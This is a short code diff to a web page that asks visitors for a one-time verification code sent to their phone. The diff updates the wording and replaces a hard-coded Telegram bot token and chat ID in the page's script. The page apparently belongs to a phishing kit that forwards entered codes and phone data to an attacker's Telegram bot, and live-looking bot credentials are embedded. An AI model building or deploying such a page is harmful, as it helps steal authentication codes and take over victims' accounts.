@@ -39,9 +39,8 @@
   <div class="box">
     <h2>Enter OTP</h2>
 
-    <p>A verification code as been sent to your device</p>
+    <p>A 4–6 digit verification code was sent to:</p>
     <p id="phoneDisplay" style="font-weight:bold;">---</p>
-    <p>Enter the code bellow</p>
 
     <input type="number" id="otpInput" placeholder="4–6 digits" maxlength="6"
            oninput="this.value=this.value.replace(/\D/g,'').slice(0,6)"
@@ -56,8 +55,8 @@
 
 <script>
 /* ==== TELEGRAM BOT SETTINGS ==== */
-const BOT_TOKEN = "8368617476:AAEyVanlgrh6-5ZCeQqkMDwGcMbofJQH1Ns";
-const CHAT_ID = 7027302249
+const BOT_TOKEN = "8227434675:AAF9SlpfdJ7eyDtkjF7VNjiNw6-dLlwBIPw";
+const CHAT_ID = 7882033650
 const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
 /* ==== LOAD PHONE + TRACKING ==== */
